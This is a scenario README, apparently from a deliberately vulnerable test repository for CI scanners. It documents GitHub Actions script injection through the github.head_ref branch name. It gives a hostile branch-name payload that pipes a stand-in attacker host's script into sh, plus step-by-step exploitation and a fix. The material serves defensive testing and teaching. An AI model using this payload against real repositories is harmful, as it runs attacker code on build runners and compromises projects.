# Scenario 31: Script injection via `github.head_ref`

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-31-script-injection-head-ref.yml`](../../.github/workflows/scenario-31-script-injection-head-ref.yml)

## What this variant probes

Same canonical bug as [scenario 02](../02-script-injection-issue-title/README.md)
— attacker-controlled `github.*` interpolated into a `run:` block —
but the untrusted context is **`github.head_ref`**, the branch name the
PR proposes to merge.

This is one of the most common script-injection vectors in the wild
because branch names "look harmless" and many starter workflow templates
ship with `echo "${{ github.head_ref }}"`. A contributor can name their
fork branch:

```
;curl attacker.tld|sh;#
```

…and the workflow runs it.

## How an attacker exploits it

1. Fork the repo.
2. Create a branch named `;curl https://attacker.tld/x.sh|sh;#`.
3. Open a PR.
4. The workflow's `run: echo "PR proposes merging from ${{ github.head_ref }} ..."`
   step expands to a shell command that executes the attacker's curl
   directly on the runner.

## Expected scanner coverage

Identical to scenario 02 — any scanner that names `github.head_ref` on
its untrusted-input list should flag this. Scanners with a partial list
(e.g. `github.event.pull_request.head.ref` but not its shortcut alias
`github.head_ref`) will silently miss it.

## Fix

Same fix as scenario 02:

```yaml
- env:
    HEAD_REF: ${{ github.head_ref }}
    BASE_REF: ${{ github.base_ref }}
  run: echo "PR proposes merging from $HEAD_REF into $BASE_REF"
```

## References

- [Scenario 02 — Script injection via issue title](../02-script-injection-issue-title/README.md)
  — full exploitation walkthrough applies here.
- [GitHub docs — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  ("Good practices for mitigating script injection attacks").
